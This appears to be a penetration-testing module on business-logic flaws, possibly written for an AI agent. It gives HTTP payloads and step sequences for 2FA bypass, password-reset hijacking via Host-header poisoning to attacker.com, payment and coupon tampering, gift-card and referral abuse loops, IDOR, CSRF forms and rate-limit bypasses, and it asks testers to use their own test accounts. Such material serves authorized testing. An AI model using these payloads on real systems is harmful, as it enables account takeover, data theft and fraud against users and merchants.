# Business Logic Flaws

## Trigger

Load when you see:

- **Password reset**: `/reset`, `/forgot`, `/findpwd`, `/sms`, `phone`, `code`, `token`, `step`
- **IDOR**: `/user/{id}`, `/order/{id}`, `/profile`, `uid`, `oid`, `addrid`, `hotelid`
- **Privilege escalation**: `/role`, `/permission`, `/profile`, `role`, `aid`, `isAdmin`, `level`
- **Payment/orders**: `/order/create`, `/pay`, `/checkout`, `price`, `amount`, `total`, `couponCode`, `count`
- **Captcha/verification**: `/sendSms`, `/captcha`, `/verify`, `code`, `smsCode`, `captcha`
- **Coupons/rewards**: `/coupon`, `/exchange`, `/redeem`, `points`, `giftCard`

## Attack Surface

- Multi-step processes without server-side state validation (step skipping)
- Client-submitted pricing or quantity without server re-validation
- Missing or weak CSRF tokens, SameSite cookie misconfigurations
- CAPTCHA post-verification token reuse
- Gift card self-redemption loops
- Voucher stacking beyond intended limits
- Referral/points abuse via self-referral or multi-account farming

## Decision Tree

1. Identify state transitions: can you skip steps, repeat steps, or access steps out of order?
2. Identify client-controlled values: price, quantity, discount, role, ID -- modify them
3. Identify single-use tokens/items: try consuming them multiple times (see race-conditions module)
4. Identify CSRF protections: are tokens bound to sessions? Are SameSite cookies set?
5. Identify server-side enforcement of client-side checks: if a flow works client-side, does the same flow work via direct API calls?

## Techniques

### 2FA Bypass Patterns

```http
# Pattern 1: Direct endpoint access (skip 2FA page)
GET /dashboard HTTP/1.1
Cookie: session=POST_LOGIN_SESSION

# Pattern 2: Response manipulation
# Original: {"success": false, "2fa_required": true}
# Modified: {"success": true, "2fa_required": false}

# Pattern 3: Parameter manipulation
POST /verify-2fa HTTP/1.1
{"otp":"000000","skip":true}
# Or: /verify-2fa?verified=true

# Pattern 4: Backup code brute force (often less rate-limited)
POST /verify-backup-code {"backup_code": "12345678"}
```

### Password Reset Flow Skip

```http
# 4-step process: 1) email input -> 2) verify code -> 3) set password -> 4) done
# Test: directly access step 3 URL with guessed/previous token
POST /reset-password HTTP/1.1
token=REUSED_TOKEN&new_password=hacked123

# Test: modify username in reset request
POST /reset-password HTTP/1.1
username=victim&new_password=hacked123
```

### Password Reset Host Header Poisoning

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Reset email goes to victim, but the link points to: http://attacker.com/reset?token=abc123
# Attacker captures the token from their server logs
```

### Payment Amount Manipulation

```http
# Price to zero or one cent
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}

# Negative quantity (reverses charges)
{"productId":"12345","quantity":-1,"price":0.01}

# Negative price (increases balance)
{"productId":"12345","quantity":1,"price":-100}

# Integer overflow
{"productId":"12345","quantity":9999999999,"price":9999999999}

# Currency switch
POST /order/create HTTP/1.1
{"productId":"12345","price":299,"currency":"VND"}  # 299 USD -> 299 VND

# Scientific notation
{"productId":"12345","price":1e-10}
```

### Voucher/Coupon Stacking

```http
# Multiple coupon codes in one request
POST /order/create HTTP/1.1
{"productId":"12345","coupons":["CODE1","CODE2","CODE3","CODE4"]}

# Reuse same coupon via concurrent requests (see race-conditions module)
# Combine coupon cancellation + re-apply
```

### Gift Card Self-Redemption Loop

```
1. Buy gift card A for $50 (paid with credit card)
2. Redeem gift card A on account -- get $50 balance
3. Use $50 balance to buy gift card B for $50
4. Redeem gift card B on same account -- still have $50 balance
5. Repeat: infinite free money loop if gift cards are redeemable for other gift cards
```

### Referral Bonus Abuse

```
1. Register account A
2. Get referral code from account A
3. Register accounts B, C, D... using referral code from A
4. Collect referral bonus on A for each new account
5. If no IP/device fingerprinting required: unlimited referral earnings
```

### Voucher Cancellation Exploit

```
1. Buy item A for $10 with a $5 coupon -> total $5
2. Cancel item A -> refund $5 to wallet (coupon value not deducted)
3. Repeat: gain $5 per cancelation cycle
```

### IDOR: Horizontal Privilege Escalation

```http
# Read other user's data
GET /api/orders/1001  (user A's order)
GET /api/orders/1002  (user B's order with user A's session)

# Modify other user's data (higher impact)
POST /api/profile/update
{"user_id": 1002, "email": "attacker@evil.com"}
```

### IDOR: Vertical Privilege Escalation

```http
# Low-privilege user accesses admin endpoint
GET /api/admin/users HTTP/1.1
Authorization: Bearer USER_TOKEN  (should require admin token)

# Modify own role
PUT /api/users/1001
{"role": "admin", "is_admin": true}
```

### Header-Based Authentication Bypass

```http
GET /admin HTTP/1.1
X-User-Role: admin
X-User-Id: 1
X-Original-User: admin
X-Forwarded-User: admin
Cookie: role=admin; isAdmin=1
```

### CSRF Token Bypass

```html
<!-- Check: is token checked on all methods? -->
<form action="http://target/change-email" method="POST">
  <!-- Remove the csrf_token parameter entirely -->
</form>

<!-- Check: is token bound to the user session? -->
<!-- Use your own token in a CSRF attack against the victim -->

<!-- Check: is token predictable? -->
<!-- Token = MD5(username + timestamp) -> forge for any user -->

<!-- SameSite=Lax bypass via GET navigation -->
<img src="http://target/change-email?email=attacker@evil.com" style="display:none">
```

### CAPTCHA Verification Leak

```http
# Step 1: Request SMS code
POST /api/sendSms HTTP/1.1
{"phone": "13800138000"}

# Step 2: Check response for verification code leak
# Response body: {"code": 200, "verifyCode": "123456"}
# Or in response header: X-Captcha-Code: 123456
# Or in Set-Cookie: captcha=MTIzNDU2 (base64 of 123456)
```

## Bypass

| Block | Bypass |
|-------|--------|
| Single IP rate limit | X-Forwarded-For rotation, proxy pool |
| Same phone rate limit | Add dots, +prefix, leading zeros: `138.8888.8888`, `+861388888888`, `013888888888` |
| Time-limited token | Modify `Date` header or timezone parameter |
| One-time token | Concurrent use before server marks it used |
| CAPTCHA | OCR (ddddocr), reuse analysis, response manipulation |
| CSRF token | Check if token is bound to session; remove token entirely and see if it's enforced |
| 2FA enforced | Direct endpoint access, response manipulation |

## Verification

- Payment manipulation: submit order, check that the total is the modified value (do NOT complete payment with real funds)
- Password reset: reset your own test account via the bypass
- IDOR: confirm with two test accounts (A reads/writes B's data)
- CSRF: craft a PoC HTML form and demonstrate it works from a different origin

## Pitfalls

- Payment manipulation PoCs should stop at order creation. Do NOT complete the payment even for 0.01.
- For IDOR, use TWO test accounts you control. Never access real user data.
- Password reset bugs have CRITICAL impact -- reset a test account, not a real user.
- CAPTCHA verification codes leaked in responses are common in mobile APIs.
- CSRF on JSON endpoints may still work via `text/plain` Content-Type (no preflight).
- Clickjacking + self-XSS can chain to full XSS -- self-XSS alone is not a vulnerability,
  but clickjacking + self-XSS is exploitable.
